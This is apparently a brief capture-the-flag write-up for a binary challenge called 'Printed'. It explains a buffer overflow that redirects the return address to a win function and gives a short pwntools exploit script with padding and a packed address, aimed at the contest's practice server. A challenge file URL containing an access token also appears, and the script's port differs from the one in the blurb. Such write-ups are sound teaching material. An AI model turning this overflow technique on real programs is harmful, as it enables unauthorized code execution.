
# Printed

lol i fixed my printer. it just prints stuff now, you can use it now i guess.

(even if the initial prompt does not show up, the challenge should function as expected)

nc challs.bcactf.com 37643

https://play.bcactf.com/files/1d9f59556bce10db156a3b5f69a28a7b/printed.c?token=eyJ1c2VyX2lkIjozMDYsInRlYW1faWQiOjE5NSwiZmlsZV9pZCI6NjB9.aFroSQ.hlPs26RmzRp5us-FpNqPiTbq61Q

## Solve

had an overflow vulnerability by which we could overwrite the `\0` character get the return address to point to the `win` function.

```python
from pwn import *

HOST = 'challs.bcactf.com'
PORT = 45619

win = p32(0x080490bd)

payload = b"A" * 100     # buffer up to saved EBP
payload += b"B" * 4      # dummy EBP
payload += win           # overwrite return address

p = remote(HOST, PORT)
p.sendline(payload)
print(p.recvall().decode(errors='ignore'))
```